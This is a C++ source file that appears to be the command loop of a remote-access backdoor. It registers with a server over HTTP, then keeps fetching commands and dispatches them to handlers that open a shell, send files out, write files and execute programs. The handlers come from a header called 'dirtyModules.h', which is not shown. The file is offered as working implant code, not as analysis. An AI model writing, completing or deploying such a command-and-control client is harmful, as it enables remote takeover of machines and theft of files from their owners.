
#include <iostream>
#include <vector>
#include "dirtyModules.h"
#include "httpManager.h"
#include "simpleCurl.h"

typedef enum 
opcao
{
    op_openShell,
    op_sendfile,
    op_writefile,
    op_execute,
    op_install,
    op_run,
    op_isOK,
    op_nop
} options;

using namespace std;

options 
cmd2Enum( string& cmd )
{
    options result=op_nop;
    vector<string> cmds={"openShell","sendfile","writefile","execute","install","run", "isOK","nop"};

    for(unsigned i=0;  i < cmds.size();i++ )
    {   
        if (cmd==cmds[i]){
            result=static_cast<options>(i);
            return result;
        }
    }
    return result ;
}

int 
main()
{
    httpManager manager;
    
    manager.makeRegister();

    while (1){
        vector <string> cmd = manager.getComand();
        options option=cmd2Enum(cmd[0]);
        cmd.erase(cmd.begin());
        //colocar cmd como comando a receber

        switch (option)
        {
        case op_openShell:
            cout << "opening shell" << endl;
            openShell(cmd,manager);
            break;

        case op_sendfile:
            cout << "op_sendfile" << endl;
            sendfile(cmd,manager);
            break;
        
        case op_writefile:
            cout << "op_writefile" << endl;
            writefile(cmd,manager);
            break;
        
        case op_execute:
            cout << "op_execute" << endl;
            execute(cmd,manager);
            break;

        case op_run:
            cout << "op_run" << endl;
            run(cmd,manager);
            break;
        
        case op_isOK:
            cout << "op_isOK" << endl;
            isOK(manager);
            break;

        case op_nop:
            cout << "NOP" << endl;
            break;
        
        
        default:
            cout << "unkownOption" << endl;
            break;
        }

    }
}